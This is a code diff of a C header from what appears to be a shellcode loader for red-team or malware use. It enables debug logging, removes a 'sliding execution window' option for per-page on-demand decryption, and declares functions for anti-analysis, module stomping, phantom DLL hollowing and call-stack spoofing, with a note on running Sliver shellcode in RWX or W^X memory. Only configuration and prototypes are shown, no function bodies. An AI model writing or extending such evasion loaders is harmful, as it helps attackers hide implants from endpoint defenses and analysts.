@@ -11,20 +11,12 @@
 
 // ----------- Build Config -----------
 // Uncomment for debug output (log file)
-// #define DEBUG
+#define DEBUG
 
 // Uncomment for Go-based shellcode (Sliver) that writes to own pages.
-// When defined: memory is PAGE_EXECUTE_READWRITE, sliding window disabled.
-// When not defined: memory is PAGE_EXECUTE_READ (W^X), sliding window available.
+// When defined: memory is PAGE_EXECUTE_READWRITE.
+// When not defined: memory is PAGE_EXECUTE_READ (W^X).
 // #define RWX_SHELLCODE
-
-// Uncomment to enable sliding execution window (per-page on-demand decryption).
-// Incompatible with RWX_SHELLCODE — forces PAGE_EXECUTE_READ.
-// #define SLIDING_WINDOW
-
-#if defined(SLIDING_WINDOW) && defined(RWX_SHELLCODE)
-#error "SLIDING_WINDOW and RWX_SHELLCODE are mutually exclusive"
-#endif
 
 // Subsystem is controlled by build.bat LFLAGS (/SUBSYSTEM:WINDOWS)
 
@@ -154,11 +146,6 @@ BOOL AntiAnalysis(VOID);
 // ----------- Module Stomping / Phantom DLL Hollowing -----------
 BOOL ModuleStomp(IN PAPI_HASHING pApi, IN PBYTE pShellcode, IN DWORD dwShellcodeSize, OUT PVOID* ppExecAddr);
 BOOL PhantomDllHollow(IN PAPI_HASHING pApi, IN PNTAPI_FUNC pNtApis, IN PBYTE pShellcode, IN DWORD dwShellcodeSize, OUT PVOID* ppExecAddr);
-
-// ----------- Sliding Execution Window -----------
-#ifdef SLIDING_WINDOW
-BOOL ActivateSlidingWindow(IN PAPI_HASHING pApi, IN PVOID pExecBase, IN DWORD dwSize);
-#endif
 
 // ----------- Call Stack Spoofing (ASM) -----------
 extern VOID SetSpoofTarget(PVOID pTarget, PVOID pCallGadget);
